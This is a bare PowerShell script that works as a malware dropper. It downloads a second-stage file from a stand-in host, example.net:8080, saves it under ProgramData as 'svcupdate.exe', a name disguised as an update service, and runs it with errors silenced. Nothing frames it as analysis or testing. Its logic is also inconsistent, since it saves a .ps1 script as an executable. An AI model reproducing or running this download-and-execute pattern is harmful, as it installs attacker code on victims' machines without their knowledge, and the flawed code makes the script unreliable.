
[CmdletBinding()]
param(
    [string]$TargetUrl = "http://example.net:8080/stage2.ps1",
    [string]$DropPath = 'C:\ProgramData\svcupdate.exe'
)
(New-Object System.Net.WebClient).DownloadFile($TargetUrl, $DropPath)
Start-Process -FilePath $DropPath -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
